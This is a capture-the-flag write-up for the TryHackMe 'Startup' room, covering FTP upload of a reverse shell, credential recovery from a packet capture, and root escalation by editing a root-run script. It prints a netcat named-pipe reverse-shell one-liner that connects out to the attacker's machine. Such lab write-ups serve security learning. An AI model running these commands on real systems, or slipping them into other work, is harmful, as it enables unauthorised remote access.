---
title: "Startup - TryHackMe"
date: "2020-12-19"
categories: 
  - "tryhackme"
---

write-up for Tryhackme room [Startup](https://tryhackme.com/room/startup)

Difficulty level - Easy

Start with Nmap scan

```
nmap -A -oN initial 10.10.245.134
```

![](/Images/startup/IMG-001.png)

Result show Anonymous FTP login possible we log in to FTP, download available files and go through all directories

![](/Images/startup/Screenshot-2020-12-19-234638.png)

Now go to web page, its look empty so run gobuster on it

![](/Images/startup/Screenshot-2020-12-19-235826.png)

when we go through the "**/files**" we can notice the same documents which we found in FTP login, so if we can upload a Reverse Shell to using FTP login we can get shell

Upload your prefer reverse shell code, you can find some reverse shell [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Upload reverse shell into "**ftp**" folder then navigate into location in browser and execute the code.

![](/Images/startup/Screenshot-2020-12-20-001204.png)

Success result would be like this

![](/Images/startup/Screenshot-2020-12-20-001447.png)

we need to change into stable shell for type this command and get stable shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

when we go thought directories we come across "**.pcapng**" file which is inside incident folder, download the file to local PC and analysis the packets.

when we analyses the file we notice some password attempts

![](/Images/startup/Screenshot-2020-12-20-002418.png)

we have a username and password, so can switch user or try login with SSH, i chose SSH because it give more stable shell.

## Privilege Escalation

There is script which is owned by root when execute it will echo which written in "/etc/print.sh" this file owed by lennie we can write the file so we can edit and another shell inside it.

![](/Images/startup/Screenshot-2020-12-20-004137.png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Local IP> 9999 >/tmp/f/
```

after adding this to file, execute or wait some time.

![](/Images/startup/Screenshot-2020-12-20-003844.png)

Finally root.
